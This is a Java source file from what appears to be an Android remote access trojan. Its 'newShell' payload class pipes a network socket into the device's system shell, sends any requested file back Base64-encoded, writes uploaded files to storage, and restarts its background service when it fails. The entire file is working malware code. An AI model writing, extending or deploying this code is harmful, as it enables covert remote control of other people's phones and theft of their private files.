package com.example.androidrat.Payloads;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;

import com.example.androidrat.mainService;
import com.example.androidrat.functions;
import com.example.androidrat.jobScheduler;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.Socket;


public class newShell {
    private static final String TAG = "newShellClass";
    private Context context;
    private functions functions;
    private Activity activity;

    public newShell(Activity activity, Context context) {
        this.context = context;
        this.activity = activity;
        this.functions = new functions(activity);
    }

    public void executeShell(final Socket socket, OutputStream outputStream) throws Exception {
        outputStream.write("----------Starting Shell----------\n".getBytes("UTF-8"));
        outputStream.write("END123\n".getBytes("UTF-8"));
        String cmd = "system/bin/sh";
        Process process = new ProcessBuilder(cmd).redirectErrorStream(true).start();
        InputStream processInput = process.getInputStream();
        InputStream processError = process.getErrorStream();
        InputStream socketInput = socket.getInputStream();
        OutputStream processOutput = process.getOutputStream();
        OutputStream socketOutput = socket.getOutputStream();
        BufferedReader socketReader = new BufferedReader(new InputStreamReader(socketInput));
        BufferedReader processReader = new BufferedReader(new InputStreamReader(processInput));

        String line;
        while (!socket.isClosed()) {
            try {
                handleProcessOutput(processReader, socketOutput);
                handleProcessError(processError, socketOutput);
                handleSocketInput(socketReader, processOutput, socketOutput);
                Thread.sleep(50);
                if (process.exitValue() != 0) {
                    break;
                }
            } catch (Exception e) {
                Log.e(TAG, "Error during shell execution", e);
                restartService();
                break;
            }
        }
        socketOutput.write("Exiting\n".getBytes("UTF-8"));
        socketOutput.write("END123\n".getBytes("UTF-8"));
        process.destroy();
    }

    private void handleProcessOutput(BufferedReader processReader, OutputStream socketOutput) throws IOException {
        StringBuilder output = new StringBuilder();
        while (processReader.ready()) {
            String line = processReader.readLine();
            output.append(line).append("\n");
        }
        if (output.length() > 0) {
            Log.d(TAG, output.toString());
            socketOutput.write(output.toString().getBytes("UTF-8"));
            socketOutput.write("END123\n".getBytes("UTF-8"));
        }
    }

    private void handleProcessError(InputStream processError, OutputStream socketOutput) throws IOException {
        while (processError.available() > 0) {
            socketOutput.write(processError.read());
        }
    }

    private void handleSocketInput(BufferedReader socketReader, OutputStream processOutput, OutputStream socketOutput) throws IOException {
        while (socketReader.ready()) {
            String command = socketReader.readLine();
            Log.d(TAG, command);
            if (command.startsWith("putFile")) {
                handlePutFileCommand(command, socketOutput);
            } else if (command.startsWith("get ")) {
                handleGetFileCommand(command, socketOutput);
            } else if (command.startsWith("put ")) {
                socketOutput.write("putFile\nEND123\n".getBytes("UTF-8"));
            } else {
                processOutput.write(command.getBytes("UTF-8"));
            }
        }
    }

    private void handlePutFileCommand(String command, OutputStream socketOutput) throws IOException {
        String[] data = command.split("<");
        String filename = data[1];
        String fileext = data[2];
        String encodedString = data[3].replace("END123\n", "");
        saveBase64Data(filename + "." + fileext, encodedString);
    }

    private void handleGetFileCommand(String command, OutputStream socketOutput) throws IOException {
        String filepath = command.split(" ")[1].trim();
        Log.d(TAG, filepath);
        File file = new File(filepath);
        if (file.exists()) {
            String base64Data = getBase64Data(file);
            if (base64Data == null) {
                socketOutput.write("Cant transfer Large File\nEND123\n".getBytes("UTF-8"));
            } else {
                String sendingFileData = "getFile\nEND123\n" + filepath + "|_|" + base64Data + "\nEND123\n";
                socketOutput.write(sendingFileData.getBytes("UTF-8"));
            }
        } else {
            Log.d(TAG, "File doesn't exist");
            socketOutput.write("File Doesn't Exist\nEND123\n".getBytes("UTF-8"));
        }
    }

    private String getBase64Data(File file) {
        if (file.length() > 16000000) { // Limit file size to 16MB
            return null;
        }
        try (InputStream is = new FileInputStream(file)) {
            byte[] bytes = new byte[(int) file.length()];
            is.read(bytes);
            return Base64.encodeToString(bytes, Base64.DEFAULT);
        } catch (IOException e) {
            Log.e(TAG, "Error reading file", e);
            return null;
        }
    }

    private void saveBase64Data(String filename, String base64Data) {
        File directory = new File(context.getExternalFilesDir(null), "temp");
        if (!directory.exists()) {
            directory.mkdirs();
        }
        File file = new File(directory, filename);
        new Thread(() -> {
            try {
                byte[] data = Base64.decode(base64Data, Base64.NO_WRAP);
                try (FileOutputStream fos = new FileOutputStream(file)) {
                    fos.write(data);
                }
            } catch (IOException e) {
                Log.e(TAG, "Error saving file", e);
            }
        }).start();
    }

    private void restartService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            functions.jobScheduler(context);
        } else {
            activity.runOnUiThread(() -> context.startService(new Intent(context, mainService.class)));
        }
    }
}